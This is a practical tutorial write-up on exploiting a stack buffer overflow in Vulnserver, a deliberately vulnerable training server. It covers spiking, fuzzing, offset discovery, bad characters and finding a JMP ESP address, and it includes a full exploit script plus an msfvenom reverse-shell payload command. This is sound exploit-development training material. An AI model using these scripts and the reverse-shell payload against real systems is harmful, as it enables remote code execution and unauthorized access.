---
date: '2025-02-02T00:20:03+05:30'
draft: false
title: 'Buffer Overflows Made Easy: A Practical Guide'
slug: buffer-overflow-made-easy
tags: ["buffer-overflow", "vulnserver", "exploit-development", "tcm-security"]
category: writeups
showtoc: true
summary: A step-by-step practical guide to buffer overflow exploitation using Vulnserver, from spiking to shellcode generation
description: Learn buffer overflow exploitation through hands-on practice with Vulnserver, including detailed steps for fuzzing, finding offsets, and generating shellcode
---

# Buffer Overflows Made Easy: A Practical Guide

## Environment Setup

### Required Tools
1. **Target Environment**
   - Windows 10 VM
   - [Vulnserver](https://github.com/stephenbradshaw/vulnserver)
   - Immunity Debugger
   - Mona.py script

2. **Attack Machine**
   - Kali Linux/Debian
   - Python
   - Metasploit Framework tools

## Step 1: Spiking

Spiking identifies vulnerable parts of the program using `generic_send_tcp`.

```bash
./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
# Example
./generic_send_tcp 192.168.0.105 9999 trun.spk 0 0
```

### Spike Script Example
```spk
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

**Process:**
1. Attach executable to Immunity Debugger
2. Run spike script
3. Monitor for crashes
4. Note if EIP is overwritten

## Step 2: Fuzzing

After identifying vulnerable commands through spiking, we fuzz them to find crash points.

### Fuzzing Script
```python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.105',9999))
        
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
        
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```

## Step 3: Finding the Offset

### Pattern Creation
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_length>
```

### Offset Script
```python
#!/usr/bin/python
import sys, socket

offset = "<pattern>"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.105',9999))
    s.send(('TRUN /.:/' + offset))
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
```

### Finding Exact Offset
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP_value>
```

## Step 4: Overwriting EIP

### EIP Overwrite Verification
```python
#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.105',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
```

## Step 5: Finding Bad Characters

### Bad Character Script
```python
#!/usr/bin/python
import sys, socket

badchars = (
"\x01\x02\x03\x04\x05...\xff"
)

shellcode = "A" * 2003 + "B" * 4 + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.105',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
```

**Process:**
1. Remove \x00 by default
2. Send all characters
3. Follow ESP in dump
4. Note disrupted sequences

## Step 6: Finding Return Address

### Mona Configuration
1. Place mona.py in Immunity Debugger's PyCommands
2. Check modules: `!mona modules`
3. Find JMP ESP:
   ```bash
   /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
   nasm > JMP ESP
   00000000 FFE4
   ```
4. Search in mona:
   ```
   !mona find -s "\xff\xe4" -m essfunc.dll
   ```

## Step 7: Generating Shellcode

### MSFvenom Command
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```

### Final Exploit
```python
#!/usr/bin/python
import sys, socket

overflow = "A" * 2003
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
shellcode = ("<generated_shellcode>")

buffer = overflow + retn + padding + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.105',9999))
    s.send(('TRUN /.:/' + buffer))
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
```

## Best Practices

1. **Pre-Exploitation**
   - Back up target system
   - Document initial state
   - Test in isolated environment

2. **During Exploitation**
   - Take detailed notes
   - Verify crashes consistently
   - Test multiple return addresses

3. **Post-Exploitation**
   - Clean up test files
   - Restore system state
   - Document successful payload

## Common Issues

1. **Inconsistent Crashes**
   - Verify buffer size
   - Check network connectivity
   - Restart target application

2. **Failed Shellcode Execution**
   - Verify bad characters
   - Check for DEP/ASLR
   - Adjust NOP sled size

## References

1. [Vulnserver GitHub](https://github.com/stephenbradshaw/vulnserver)
2. [Corelan Mona](https://github.com/corelan/mona)
3. [TCM Security Training](https://tcm-sec.com/)
4. [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
